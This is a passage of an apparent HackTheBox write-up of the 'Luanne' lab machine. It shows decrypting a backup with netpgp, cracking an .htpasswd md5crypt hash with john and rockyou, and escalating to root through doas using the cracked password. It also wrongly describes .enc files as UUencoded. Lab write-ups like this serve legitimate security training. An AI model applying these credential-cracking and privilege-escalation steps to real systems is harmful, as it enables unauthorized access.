+ea5f0ce6************************
+</pre></table></code></div></div><h3 id="enumeration-1"><span class="mr-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>inside the <code class="language-plaintext highlighter-rouge">/home/r.michaels/backups</code> folder there is a file named <code class="language-plaintext highlighter-rouge">devel_backup-2020-09-16.tar.gz</code> -<div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="p">luanne$ pwd
+</span><span class="err">/home/r.michaels/backups</span>
+luanne$ ls -la
+<span class="p">total 12
+dr-xr-xr-x  2 r.michaels  users   512 Nov 24 09:26 .
+dr-xr-x---  7 r.michaels  users   512 Sep 16 18:20 ..
+</span><span class="gd">-r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
+</span></pre></table></code></div></div></ul><p><strong>enc file extention:</strong> The .enc file extension is used by files in the UUencoded format, which are encrypted files.</p><p><strong>UUenconded format:</strong> Unix-to-Unix encode (UUENCODE) format is a form of binary-to-text encoding that originated in the Unix programs uuencode and uudecode written by Mary Ann Horton at UC Berkeley in 1980, for encoding binary data for transmission in email systems.</p><p><strong>Tool:</strong> in openbsd there is tool called <a href="https://man.netbsd.org/netpgp.1">netpgp</a> that can be use to encrypt or decrypt.</p><ul><li>decrypt <code class="language-plaintext highlighter-rouge">.enc</code> file<div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="p">luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/devel_backup-2020-09-16.tar.gz 
+signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
+Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
+uid              RSA 2048-bit key &lt;r.michaels@localhost&gt;
+luanne$ ls -la /tmp
+</span><span class="gd">-rw-------   1 r.michaels  wheel  1639 Nov 29 09:07 devel_backup-2020-09-16.tar.gz
+</span></pre></table></code></div></div><li>file delete after a minute so i copied it locally - ```diff ❯ scp -i id_rsa r.michaels@10.10.10.218:/tmp/devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz 100% 1639 2.6KB/s 00:00</ul><p>❯ tar -xf devel_backup-2020-09-16.tar.gz</p><p>❯ cd devel-2020-09-16</p><p>❯ ls -la</p><p>drwxr-xr-x 2 x00tex x00tex 4096 Sep 16 20:42 webapi drwxr-xr-x 2 x00tex x00tex 4096 Nov 29 20:06 www</p><p>❯ cd www</p><p>❯ ls -la –rw-r–r– 1 x00tex x00tex 47 Sep 16 23:44 .htpasswd -rw-r–r– 1 x00tex x00tex 378 Sep 16 20:33 index.html</p><p>❯ cat .htpasswd +webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>
+* inside the tar archive there is a server backup data and also the `.htpasswd` file with same username but this time the hash is diffrent.
+
+#### john
+
+```diff
+❯ echo 'webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.' &gt;&gt; hash
+
+❯ john hash -w=/usr/share/wordlists/rockyou.txt
+Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Remaining 1 password hash
+
++littlebear       (webapi_user)
+
+Session completed
+
+❯ john hash --show
+webapi_user:iamthebest
++webapi_user:littlebear
+
+2 password hashes cracked, 0 left
+</pre></table></code></div></div><ul><li>we get a new password.<li><p>try su to root but this time user <code class="language-plaintext highlighter-rouge">r.michaels</code> don’t have su rights.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>  luanne$ su - root
+  su: You are not listed in the correct secondary group (wheel) to su root.
+  su: Sorry: Authentication error
+</pre></table></code></div></div><li>try <code class="language-plaintext highlighter-rouge">doas</code> and this time it worked.</ul><h1 id="root-escalation">Root escalation</h1><div class="language-diff highlighter-rouge"><div class="code-header"> <span data-label-text="Diff"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="gi">+luanne$ doas -u root /bin/sh
++Password: littlebear
+</span><span class="err">#</span> id
+<span class="gi">+uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
+</span><span class="err">#</span> cd /root
+<span class="err">#</span> cat root.txt
+<span class="p">7a9b5c20************************
+</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a>, <a href='/categories/linux/'>linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >command injection</a> <a href="/tags/unix-to-unix-encode/" class="post-tag no-text-decoration" >Unix-to-Unix encode</a> <a href="/tags/doas/" class="post-tag no-text-decoration" >doas</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox - Luanne - Poorduck&amp;url=https://x00tex.github.io/posts/luanne/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox - Luanne - Poorduck&amp;u=https://x00tex.github.io/posts/luanne/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://x00tex.github.io/posts/luanne/&amp;text=Hackthebox - Luanne - Poorduck" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/meta/">Hackthebox - Meta</a><li><a href="/posts/pandora/">Hackthebox - Pandora</a><li><a href="/posts/writer/">Hackthebox - Writer</a><li><a href="/posts/blunder/">Hackthebox - Blunder</a><li><a href="/posts/luanne/">Hackthebox - Luanne</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/unicode/"><div class="card-body"> <em class="timeago small" data-ts="1638383400" > 2021-12-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Unicode</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.126 hackmedia.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux...</p></div></div></a></div><div class="card"> <a href="/posts/writer/"><div class="card-body"> <em class="timeago small" data-ts="1639420200" > 2021-12-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Writer</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.101 writer.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; ...</p></div></div></a></div><div class="card"> <a href="/posts/unbalanced/"><div class="card-body"> <em class="timeago small" data-ts="1606156200" > 2020-11-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Unbalanced</h3><div class="text-muted small"><p> Scanning Nmap ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.200 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/compromised/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox - Compromised</p></a> <a href="/posts/ready/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox - Ready</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/p00rduck">p00rduck</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
